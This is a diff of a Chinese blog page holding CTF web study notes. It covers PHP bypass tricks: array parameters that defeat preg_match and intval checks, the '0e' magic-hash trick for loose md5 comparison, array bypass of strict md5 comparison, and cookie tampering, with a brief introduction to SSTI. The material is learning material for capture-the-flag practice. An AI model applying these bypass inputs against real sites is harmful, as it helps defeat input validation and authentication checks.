+<p>脚本存在wsl，附上链接<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p>
+<h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><p>一般会给你一些源码，你只需要阅读源码之后，根据php语言的特性去绕过。php常用于各类网页的后端代码，所以在复杂一点或者实际的应用场景时，多用于拿到网页源代码之后再去进行绕过。</p>
+<p>学习链接<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/261802.html">https://www.freebuf.com/articles/web/261802.html</a></p>
+<p>随着学习逐步更新php特性</p>
+<h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><p>正则匹配，利用数组绕过</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">intval($val)<span class="hljs-comment">;</span><br>$val=$_GET[<span class="hljs-string">&#x27;num&#x27;</span>]<span class="hljs-comment">;</span><br>?num[]=<span class="hljs-number">1</span>   //正则匹配检测字母元素时不考虑数组元素的具体内容，直接返回<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><p>这个函数可以返回输入变量的整数部分，可以用传入数组的方法绕过，其他绕过方式在这里<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/131156104">https://blog.csdn.net/wangyuxiang946/article/details/131156104</a></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">intval(<span class="hljs-variable">$val</span>);<br><span class="hljs-variable">$val</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>?num[]=<span class="hljs-number">1</span>   <span class="hljs-regexp">//i</span>ntval()检测字母元素时不考虑数组元素的具体内容，只关心数组中有没有元素，有元素返回<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h3><p>分为两种，弱比较和强比较</p>
+<h4 id="弱比较"><a href="#弱比较" class="headerlink" title="弱比较"></a>弱比较</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">($_POST[<span class="hljs-string">&#x27;c1&#x27;</span>])</span></span>==<span class="hljs-built_in">md5</span>($_POST<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;c2&#x27;</span>]</span>)<br><span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)</span></span> == <span class="hljs-built_in">md5</span>(<span class="hljs-number">240610708</span>)<br></code></pre></td></tr></table></figure>
+
+<p>使用0e绕过，因为弱比较会将0e开头的字符串视为科学计数法，相当于0</p>
+<h4 id="强比较"><a href="#强比较" class="headerlink" title="强比较"></a>强比较</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">md5</span><span class="hljs-params">($_POST[<span class="hljs-string">&#x27;c1&#x27;</span>])</span></span>===<span class="hljs-built_in">md5</span>($_POST<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;c2&#x27;</span>]</span>)<br></code></pre></td></tr></table></figure>
+
+<p>使用数组绕过，c1[]&#x3D;1，c2[]&#x3D;2</p>
+<h3 id="cookie传参"><a href="#cookie传参" class="headerlink" title="cookie传参"></a>cookie传参</h3><p>利用hackbar，直接在cookie栏里设定<strong>val&#x3D;xxx</strong></p>
+<h2 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h2><p>服务端模板注入</p>
+<p>服务端模板：<strong>服务端模板（Server-Side Template）</strong> 是指在<strong>服务器端</strong>运行的、用于动态生成文本内容（通常是 HTML 页面，但也可能是 JSON、XML、邮件、配置文件等）的一种技术。它使用“模板引擎”来解析模板文件，结合程序传入的数据，渲染出最终输出。</p>
+
                 
               </div>
             
@@ -295,6 +601,34 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf-web/" class="print-no-link">#ctf-web</a>
+      
+    </div>
   
 </div>
 
@@ -349,12 +683,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2025/09/11/nssctf/" title="nssctf">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">nssctf</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/02/19/TCP-IP/" title="TCP-IP">
-                        <span class="hidden-mobile">TCP-IP</span>
+                      <a href="/2025/02/19/c/" title="c++">
+                        <span class="hidden-mobile">c++</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
